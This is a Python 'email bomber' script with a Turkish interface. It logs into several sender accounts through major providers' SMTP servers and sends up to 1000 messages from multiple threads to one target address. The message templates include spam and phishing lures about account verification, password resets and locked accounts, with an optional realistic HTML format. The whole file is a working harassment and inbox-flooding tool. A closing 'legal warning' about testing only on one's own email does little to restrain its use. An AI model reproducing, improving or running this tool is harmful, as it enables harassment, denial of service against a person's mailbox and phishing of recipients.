#!/usr/bin/env python3
# KSIB EMAIL BOMBER PRO v2.0
import smtplib, threading, random, time, sys, os, json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from colorama import init, Fore, Style
init(autoreset=True)

SIFRE = "admiral71100daphne"

def giris():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "\n🔐 KSIB GİRİŞ\n")
    for i in range(3):
        s = input(Fore.YELLOW + "🔑 Şifre: ")
        if s == SIFRE:
            print(Fore.GREEN + "\n✅ Başarılı!\n")
            return True
        print(Fore.RED + f"❌ Hatalı! ({2-i} hakkın)")
    sys.exit(0)

class EmailBomberPro:
    def __init__(self):
        self.b = 0
        self.f = 0
        self.lock = threading.Lock()
        self.st = None
        self.mx = 0
        self.s = 0
        self.running = True
        
        # SMTP sunucuları
        self.smtp_servers = {
            "gmail.com": {"server": "smtp.gmail.com", "port": 587},
            "hotmail.com": {"server": "smtp.office365.com", "port": 587},
            "outlook.com": {"server": "smtp.office365.com", "port": 587},
            "live.com": {"server": "smtp.office365.com", "port": 587},
            "yahoo.com": {"server": "smtp.mail.yahoo.com", "port": 587},
            "yandex.com": {"server": "smtp.yandex.com", "port": 587},
            "protonmail.com": {"server": "smtp.protonmail.com", "port": 587},
            "icloud.com": {"server": "smtp.mail.me.com", "port": 587},
            "aol.com": {"server": "smtp.aol.com", "port": 587},
            "zoho.com": {"server": "smtp.zoho.com", "port": 587},
        }
        
        # Email şablonları
        self.subjects = {
            "spam": ["ÖNEMLİ BİLGİ", "Hesap Bildirimi", "FIRSAT! %50 İndirim", "Tebrikler! Kazandınız!"],
            "phishing": ["Güvenlik Uyarısı", "Hesap Doğrulama", "Şifre Sıfırlama", "Hesap Kilitlendi!"],
            "ads": ["ÖZEL TEKLİF", "Son 24 Saat!", "Size Özel Kampanya", "Kaçırmayın!"],
            "social": ["Yeni mesajın var", "Arkadaşlık isteği", "Seni etiketledi", "Yeni takipçi"],
            "business": ["Fatura", "Sipariş Onayı", "Kargo Takip", "Ödeme Alındı"],
        }
        
        self.bodies = {
            "spam": [
                "Merhaba, size özel kampanyamızdan yararlanmak için tıklayın!",
                "Tebrikler! 1000 TL hediye çeki kazandınız!",
                "Son 24 saat! Kaçırmayın!",
            ],
            "phishing": [
                "Hesabınızda şüpheli hareket tespit edildi. Hemen doğrulayın:",
                "Şifreniz 24 saat içinde sıfırlanacak. İptal için tıklayın:",
                "Hesabınız güvenlik nedeniyle kilitlendi. Açmak için:",
            ],
        }
    
    def bnr(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.CYAN + Style.BRIGHT + """
        ╔══════════════════════════════════════╗
        ║  📧 KSIB EMAIL BOMBER PRO v2.0     ║
        ║  Çoklu SMTP | Şablonlar | HTML     ║
        ╚══════════════════════════════════════╝
        """ + Style.RESET_ALL)
    
    def email_ekle(self):
        emailler = []
        print(Fore.YELLOW + "\n📧 GÖNDEREN EMAİL EKLE:")
        print(Fore.CYAN + "Format: email@gmail.com:şifre")
        print(Fore.CYAN + "Bitince boş bırak Enter'a bas.\n")
        
        while True:
            g = input(Fore.GREEN + f"Email {len(emailler)+1}: ")
            if not g: break
            if ':' in g:
                e, p = g.split(':', 1)
                e, p = e.strip(), p.strip()
                
                # Domain kontrolü
                domain = e.split('@')[1] if '@' in e else ''
                smtp = self.smtp_servers.get(domain, {"server": "smtp.gmail.com", "port": 587})
                
                emailler.append({
                    "email": e,
                    "pass": p,
                    "smtp": smtp["server"],
                    "port": smtp["port"],
                    "domain": domain
                })
                print(Fore.GREEN + f"✅ {e} eklendi! (SMTP: {smtp['server']})")
            else:
                print(Fore.RED + "❌ Format: email@gmail.com:şifre")
        
        return emailler
    
    def create_html_email(self, template_type="spam"):
        """HTML formatında email oluştur"""
        colors = ["#FF0000", "#00FF00", "#0000FF", "#FF6600", "#9900FF"]
        color = random.choice(colors)
        
        html = f"""
        <html>
        <head><style>
            body {{ font-family: Arial; background: #f0f0f0; }}
            .container {{ max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }}
            .header {{ background: {color}; color: white; padding: 20px; text-align: center; border-radius: 5px; }}
            .content {{ padding: 20px; }}
            .button {{ background: {color}; color: white; padding: 10px 30px; text-decoration: none; border-radius: 5px; }}
            .footer {{ text-align: center; color: #999; font-size: 12px; margin-top: 20px; }}
        </style></head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>{random.choice(['ÖNEMLİ', 'BİLDİRİM', 'UYARI', 'BİLGİ'])}</h1>
                </div>
                <div class="content">
                    <p>Sayın Kullanıcı,</p>
                    <p>{random.choice(self.bodies.get(template_type, ['Test mesajı']))}</p>
                    <p style="text-align:center; margin:30px 0;">
                        <a href="#" class="button">HEMEN TIKLA</a>
                    </p>
                </div>
                <div class="footer">
                    <p>Bu email otomatik olarak gönderilmiştir.</p>
                    <p>© {random.randint(2020,2024)} Tüm hakları saklıdır.</p>
                </div>
            </div>
        </body>
        </html>
        """
        return html
    
    def send_email(self, sender, target, use_html=False):
        try:
            # SMTP bağlantısı
            server = smtplib.SMTP(sender["smtp"], sender["port"], timeout=15)
            server.starttls()
            server.login(sender["email"], sender["pass"])
            
            # Email oluştur
            msg = MIMEMultipart('alternative')
            msg['From'] = f"Bildirim <{sender['email']}>"
            msg['To'] = target
            msg['Subject'] = random.choice(random.choice(list(self.subjects.values())))
            
            if use_html:
                html_content = self.create_html_email()
                msg.attach(MIMEText(html_content, 'html'))
            else:
                text_content = random.choice(random.choice(list(self.bodies.values())))
                msg.attach(MIMEText(text_content, 'plain'))
            
            # Gönder
            server.send_message(msg)
            server.quit()
            
            with self.lock:
                self.s += 1
                self.b += 1
            
            return True
            
        except Exception as e:
            with self.lock:
                self.f += 1
            return False
    
    def worker(self, emailler, target, use_html):
        while self.running and self.s < self.mx:
            sender = random.choice(emailler)
            self.send_email(sender, target, use_html)
            time.sleep(random.uniform(0.5, 2))
    
    def status_display(self):
        while self.running:
            time.sleep(1)
            with self.lock:
                elapsed = time.time() - self.st if self.st else 0
                rate = self.s / elapsed if elapsed > 0 else 0
                print(f"\r📧 Gönderilen: {self.s}/{self.mx} | ✅{self.b} ❌{self.f} | ⚡{rate:.1f}/s", end="")
    
    def baslat(self, target, emailler, count=100, threads=5, use_html=False):
        self.mx = count
        
        print(Fore.CYAN + f"\n📧 Hedef: {target}")
        print(Fore.CYAN + f"📊 Email: {count}")
        print(Fore.CYAN + f"🧵 Thread: {threads}")
        print(Fore.CYAN + f"📫 Gönderen: {len(emailler)} email")
        print(Fore.CYAN + f"🎨 Format: {'HTML' if use_html else 'Düz Metin'}")
        print(Fore.RED + "\n💣 BAŞLATILIYOR...\n")
        
        self.st = time.time()
        
        # Durum thread'i
        status_t = threading.Thread(target=self.status_display)
        status_t.daemon = True
        status_t.start()
        
        # İşçi thread'leri
        tl = []
        for _ in range(threads):
            t = threading.Thread(target=self.worker, args=(emailler, target, use_html))
            t.daemon = True
            t.start()
            tl.append(t)
        
        try:
            for t in tl:
                t.join()
        except KeyboardInterrupt:
            self.running = False
            print(Fore.RED + "\n[!] Durduruldu!")
        
        self.running = False
        time.sleep(1)
        
        elapsed = time.time() - self.st if self.st else 0
        rate = self.s / elapsed if elapsed > 0 else 0
        
        print(Fore.GREEN + f"\n\n✅ {self.b} email gönderildi!")
        print(Fore.RED + f"❌ {self.f} başarısız")
        print(Fore.CYAN + f"⚡ {rate:.1f} email/saniye")
        print(Fore.CYAN + f"⏱️  {elapsed:.1f} saniye")

def ana():
    giris()
    eb = EmailBomberPro()
    eb.bnr()
    
    # Email ekle
    emailler = eb.email_ekle()
    if not emailler:
        print(Fore.RED + "❌ En az 1 email eklemelisin!")
        return
    
    # Hedef
    target = input(Fore.GREEN + "\n📧 Hedef email: ").strip()
    if '@' not in target:
        print(Fore.RED + "❌ Geçerli email gir!")
        return
    
    # Sayı
    print(Fore.YELLOW + "\n📊 EMAİL SAYISI:")
    print(Fore.CYAN + "1. 10 (Test) | 2. 50 | 3. 100 | 4. 500 | 5. 1000")
    c = input(Fore.GREEN + "Seçim: ")
    ct = {"1": 10, "2": 50, "3": 100, "4": 500, "5": 1000}.get(c, 50)
    
    # Thread
    th = int(input(Fore.GREEN + f"\n🧵 Thread (1-{len(emailler)}): ") or str(min(5, len(emailler))))
    
    # Format
    print(Fore.YELLOW + "\n🎨 EMAİL FORMATI:")
    print(Fore.CYAN + "1. Düz Metin (Hızlı)")
    print(Fore.CYAN + "2. HTML (Gerçekçi)")
    fmt = input(Fore.GREEN + "Seçim: ")
    use_html = fmt == "2"
    
    # Onay
    print(Fore.RED + "\n⚠️  YASAL UYARI!")
    print(Fore.RED + "⚠️  Sadece kendi emailine test amaçlı kullan!")
    
    if input(Fore.GREEN + "\n🚀 Başlat? (E/H): ").upper() == 'E':
        eb.baslat(target, emailler, ct, th, use_html)

if __name__ == "__main__":
    try:
        ana()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Çıkış!")
        sys.exit(0)
